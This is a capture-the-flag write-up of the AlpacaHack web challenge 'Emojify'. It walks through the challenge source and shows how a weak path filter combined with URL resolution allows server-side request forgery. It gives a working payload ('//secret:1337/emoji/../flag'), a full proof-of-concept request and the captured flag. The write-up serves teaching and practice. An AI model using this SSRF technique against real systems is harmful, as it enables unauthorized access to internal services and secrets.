---
slug: "web-emojify"
title: "Emojify"
competition: "Alpacahack"
category: "Web"
difficulty: "Medium"
date: "2026-11-04"
updated: "2026-11-04"
summary: "WAF filtered not really functional and SSRF vulnerability"
tags: ["WAF","SSRF"]
status: "published"
flag: "Alpaca{Sup3r_Speci4l_Rar3_Flag}"
attachments: []
source: "https://claritys.web.id/writeups/web-emojify"
---

# Emojify

> WAF filtered not really functional and SSRF vulnerability

## Recon

We got these source code:

```python
❯ tree                                                                                                                                                                        󰥔 09:12:14
.
├── backend
│   ├── index.js
│   ├── package.json
│   └── package-lock.json
├── compose.yaml
├── Dockerfile
├── frontend
│   ├── index.html
│   ├── index.js
│   ├── package.json
│   └── package-lock.json
└── secret
    ├── index.js
    ├── package.json
    └── package-lock.json
```

Let’s see the `compose.yaml` so we can analyze how the service work.

```python
❯ cat compose.yaml                                                                                                                                                            󰥔 09:12:59
services:
  frontend:
    build:
      dockerfile: ../Dockerfile
      context: ./frontend
    restart: unless-stopped
    init: true
    ports:
      - ${PORT:-3000}:3000
  backend:
    build:
      dockerfile: ../Dockerfile
      context: ./backend
    restart: unless-stopped
    init: true
  secret:
    build:
      dockerfile: ../Dockerfile
      context: ./secret
    restart: unless-stopped
    init: true
    environment:
      - FLAG=Alpaca{REDACTED}
```

The flag its from the environment and it’s use Embedded DNS Server so the name like `backend:3000` or `frontend:3000`.

Let’s check the important code.

```python
~/ctf/alpacahack/web/emojify
❯ cat frontend/index.js                                                                                                                                                       󰥔 09:21:39
import express from "express";
import fs from "node:fs";

const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
};

express()
  .get("/", (req, res) => res.type("html").send(fs.readFileSync("index.html")))
  .get("/api", async (req, res) => {
    try {
      const path = waf(req.query.path);
      const url = new URL(path, "http://backend:3000");
      const emoji = await fetch(url).then((r) => r.text());
      res.send(emoji);
    } catch (err) {
      res.send(err.message);
    }
  })
  .listen(3000);

~/ctf/alpacahack/web/emojify
❯ cat secret/index.js                                                                                                                                                         󰥔 09:23:48
import express from "express";

const FLAG = process.env.FLAG ?? "Alpaca{REDACTED}";

express()
  // http://secret:1337/flag
  .get("/flag", (req, res) => res.send(FLAG))
  .listen(1337);

~/ctf/alpacahack/web/emojify
❯ cat backend/index.js                                                                                                                                                        󰥔 09:23:54
import express from "express";
import * as emoji from "node-emoji";

express()
  .get("/emoji/:text", (req, res) =>
    res.send(emoji.get(req.params.text) ?? "❓")
  )
  .listen(3000);
```

## Vulnerability

As we can see at the source code, the `backend/index.js` doesn’t have a vulnerability, but the `frontend/index.js` have the vulnerability.

First vulnerability at WAF filter:

```python
const waf = (path) => {
  if (typeof path !== "string") throw new Error("Invalid types");
  if (!path.startsWith("/")) throw new Error("Invalid 1");
  if (!path.includes("emoji")) throw new Error("Invalid 2");
  return path;
}; 
```

So the `path` it must:

1.  be a string
    
2.  starts with `/`
    
3.  and included string named “`emoji`"
    

Second vulnerability its from the function he use:

```python
const url = new URL(path, "http://backend:3000");
```

We can see in the document: [https://developer.mozilla.org/en-US/docs/Web/API/URL/URL](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL)

![image.png](/assets/uploads/7b1c15e3-6174-43fe-8796-67f6818ad43f-image.png)

So if we input the path there’s `//<target>` and meet up the `WAF filter` so we can receive the flag.

At `secret/index.js` is our next information.

```python
express()
  // http://secret:1337/flag
  .get("/flag", (req, res) => res.send(FLAG))
  .listen(1337);
```

the secret is listening to port `1337` and the endpoint is `/flag`. So that is our target. So let’s write the payload:

```python
//secret:1337/emoji/../flag
```

I got this payload as a conclusion, because is started with `/` and there’s a `emoji` as a string (even though i use it as a path traversal), and its as a string.

I implement it to the remote server and it works.

![image.png](/assets/uploads/e3a642c7-001f-4127-be5a-ead444dec255-image-1.png)

## PoC request

```
GET /api?path=//secret:1337/emoji/../flag HTTP/1.1
Host: 34.170.146.252:8178
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Referer: http://34.170.146.252:8178/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
